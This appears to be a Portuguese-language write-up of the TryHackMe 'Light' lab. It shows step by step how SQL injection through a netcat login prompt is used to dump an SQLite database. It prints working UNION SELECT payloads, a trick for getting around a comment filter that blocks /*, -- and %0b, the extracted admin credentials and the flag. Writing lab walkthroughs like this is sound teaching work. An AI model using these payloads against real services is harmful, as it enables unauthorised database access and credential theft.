# TryHackMe - Light Writeup

**Dificuldade:** Easy  
**SO:** Linux  
**Data:** 2026-10-10

---

## Reconhecimento

O desafio começa nos indicando fazer uma conexão via `nc` na porta 1337, que nos pede um username e uma senha:

```bash
nc <IP> 1337
```


## Identificando a Vulnerabilidade

Ao testar o campo de username com uma aspa simples `'`, o serviço retornou um erro revelador:

```
Please enter your username: '
Error: unrecognized token: "''' LIMIT 30"
```

O erro expõe que a query original termina com `LIMIT 30`, indicando que a estrutura é algo como:

```sql
SELECT ... FROM ... WHERE username = 'INPUT' LIMIT 30
```

Isso confirma a vulnerabilidade a SQL Injection.

## Enumerando o Banco de Dados

### Bloqueio de comentários

Ao tentar usar comentários SQL para ignorar o resto da query, o serviço bloqueou:

```
For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
```

Para contornar, usamos a própria aspa do final da query original para fechar a injeção, sem precisar de comentário:

```sql
' UNION SELECT ... WHERE '1'='1
```

### Descobrindo o número de colunas

Testando `UNION SELECT` com diferentes números de colunas, confirmamos que a query retorna **1 coluna**.

### Listando as tabelas

Como o banco é SQLite, usamos `sqlite_master` no lugar do `information_schema`. Para listar todas as tabelas de uma vez, usamos `group_concat`:

```
' UNION SELECT group_concat(sql) FROM sqlite_master'
```

Retorno:

```
CREATE TABLE usertable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
),CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)
```

O banco possui duas tabelas: `usertable` e `admintable`.

### Obtendo a estrutura da tabela

```
' UNION SELECT sql FROM sqlite_master WHERE type='table' AND name='admintable
```

Retorno:

```sql
CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)
```

## Extraindo os Dados

### Listando os usuários

Para listar todos os usernames da `admintable`:

```
' UNION SELECT group_concat(username) FROM admintable'
```

Retorno:

```
Password: TryHackMeAdmin,flag
```

Há dois usuários: `TryHackMeAdmin` e `flag`.

### Extraindo as credenciais do admin

```
' UNION SELECT username||':'||password FROM admintable WHERE '1'='1
```

Retorno:

```
Password: TryHackMeAdmin:mamZtAuMlrsEy5bp6q17
```

### Obtendo a flag

O usuário `flag` tem a flag como senha:

```
' UNION SELECT password FROM admintable WHERE username='flag
```

Retorno:

```
Password: THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

## Flag

```
THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

---
